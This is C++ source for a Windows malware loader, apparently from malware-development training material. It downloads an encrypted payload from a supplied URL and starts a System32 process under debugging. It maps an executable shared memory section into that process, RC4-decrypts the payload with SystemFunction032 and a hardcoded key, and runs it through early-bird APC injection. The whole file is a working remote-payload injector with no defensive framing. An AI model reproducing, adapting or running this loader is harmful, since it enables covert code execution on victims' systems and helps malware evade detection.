// EncRemMap.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <WinInet.h>

#pragma comment (lib, "Wininet.lib")
#pragma comment (lib, "OneCore.lib")	// needed to compile `MapViewOfFile2`
#pragma warning (disable:4996)

// this is what SystemFunction032 function take as a parameter
typedef struct
{
	DWORD   Length;
	DWORD   MaximumLength;
	PVOID   Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
);

BOOL GetUrl(LPCWSTR szUrl, PBYTE* pPayloadPage, SIZE_T* sPayloadSize) {

	//wprintf(L"[+] Getting payload from %s\n", szUrl);

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwPageRead = 0;

	SIZE_T		sSize = 0; 	 			// Used as the total payload size

	PBYTE		pPage = NULL,					// Used as the total payload heap buffer
		pTmpPage = NULL;					// Used as the tmp buffer (of size 1024)

	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L"MalDevAcademy", 0, NULL, NULL, 0);
	if (hInternet == NULL) {
		//printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the payload using the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		//printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpPage = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpPage == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpPage, 1024, &dwPageRead)) {
			//printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer 
		sSize += dwPageRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pPage == NULL)
			pPage = (PBYTE)LocalAlloc(LPTR, dwPageRead);
		else
			// Otherwise, reallocate the pPage to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pPage = (PBYTE)LocalReAlloc(pPage, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pPage == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pPage + (sSize - dwPageRead)), pTmpPage, dwPageRead);

		// Clean up the temp buffer
		memset(pTmpPage, '\0', dwPageRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwPageRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}


	// Saving 
	*pPayloadPage = pPage;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											// Closing handle 
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	if (pTmpPage)
		LocalFree(pTmpPage);													// Freeing the temp buffer
	return bSTATE;
}

BOOL Translate(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	// the return of SystemFunction032
	NTSTATUS        STATUS = 0;

	// making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
		Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


	// since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
	// and using its return as the hModule parameter in GetProcAddress
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	// if SystemFunction032 calls failed it will return non zero value
	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
		//printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
		return FALSE;
	}

	return TRUE;
}

unsigned char Rc4Key[] = {
		0x91, 0x80, 0x0C, 0x0F, 0x03, 0x5C, 0x21, 0x16, 0x59, 0x5C, 0x62, 0xD1, 0xF5, 0x63, 0xF8, 0x4D };

BOOL Start(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					WnDr[MAX_PATH];

	STARTUPINFO				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	// cleaning the structs 
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the value of the %WINDIR% environment variable (this is usually 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		//printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the full target process path 
	sprintf(lpPath, "%s\\System32\\%ls", WnDr, lpProcessName);
	//printf("\t[i] Running : \"%s\" ...\n", lpPath);


	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		DEBUG_PROCESS,			// Creation flag
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		&Si,					// Pointer to STARTUPINFO structure
		&Pi)) {					// Pointer to PROCESS_INFORMATION structure

		//printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	/*
		{	both CREATE_SUSPENDED & DEBUG_PROCESS will work,
			CREATE_SUSPENDED will need ResumeThread, and
			DEBUG_PROCESS will need DebugActiveProcessStop
			to resume the execution
		}
	*/

	// Populating the OUTPUT parameter with 'CreateProcessA's output'
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

BOOL Map(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* lpAddress, OUT PVOID* ppAddress) {

	BOOL		bSTATE = TRUE;
	HANDLE		hFile = NULL;
	PVOID		pMapLocalAddress = NULL,
		pMapRemoteAddress = NULL;


	// create a file mapping handle with `RWX` memory permissions
	// this doesnt have to allocated `RWX` view of file unless it is specified in the MapViewOfFile/2 call
	//printf("[+] Creating File Mapping\n");
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sPayloadSize, NULL);
	if (!hFile) {
		//printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// maps the view of the payload to the memory 
	// FILE_MAP_WRITE are the permissions of the file (payload) - 
	// since we only neet to write (copy) the payload to it
	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, sPayloadSize);
	if (!pMapLocalAddress) {
		//printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	//printf("\t[i] Copying Payload To 0x%p ...\n", pMapLocalAddress);
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

	// maps the payload to a new remote buffer (in the target process)
	// it is possible here to change the memory permissions to `RWX`
	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READWRITE);
	if (!pMapRemoteAddress) {
		//printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	//printf("[+] Mapped to remote process at 0x%p....\n", pMapRemoteAddress);

_EndOfFunction:
	*ppAddress = pMapRemoteAddress;
	*lpAddress = pMapLocalAddress;
	if (hFile)
	{
		CloseHandle(hFile);
	}
	return bSTATE;
}

int wmain(int argc, wchar_t** argv)
{

	if (argc != 3) {
		//wprintf(L"[-] Missing arguments. Usage: %s <url> <process name>\n", argv[0]);
		return -1;
	}
	SIZE_T	Size = 0;
	PBYTE	Page = NULL;
	DWORD dwProcessId = 0;
	HANDLE hThread = NULL;
	HANDLE hProcess = NULL;
	PVOID pAddress = NULL;
	PVOID lpAddress = NULL;

	wchar_t* url = argv[1];
	wchar_t* proc = argv[2];

	if (!GetUrl(url, &Page, &Size)) {
		return -1;
	}
	//printf("[+] Got payload of %lld bytes\n", Size);

	//printf("[+] Creating debugged process\n");
	if (!Start(proc, &dwProcessId, &hProcess, &hThread)) {
		//printf("[-] Error creating debugged process\n");
		return FALSE;
	}
	
	//printf("[+] Mapping memory on remote process to encrypted local payload\n");
	if (!Map(hProcess, Page, Size, &lpAddress, &pAddress)) {
		//printf("[-] Error Mapping view of file into remote process\n");
		return FALSE;
	}
	//printf("\t[+] Encrypted payload mapped to remote process 0x%p\n", pAddress);

	//printf("[+] Decrypting payload in local memory map at 0x%p\n", lpAddress);
	if (!Translate(Rc4Key, lpAddress, sizeof(Rc4Key), Size)) {
		//printf("[-] Error decrypting payload\n");
		return FALSE;
	}

	//printf("[+] Queuing for APC\n");
	if (!QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL)) {
		//printf("[-] Error queueing remote process for APC\n");
		return -1;
	}

	//printf("[+] Detaching from remote process\n");
	if (!DebugActiveProcessStop(dwProcessId)) {
		//printf("[-] Error detaching remote process\n");
		return -1;
	}

	CloseHandle(hProcess);
	CloseHandle(hThread);
}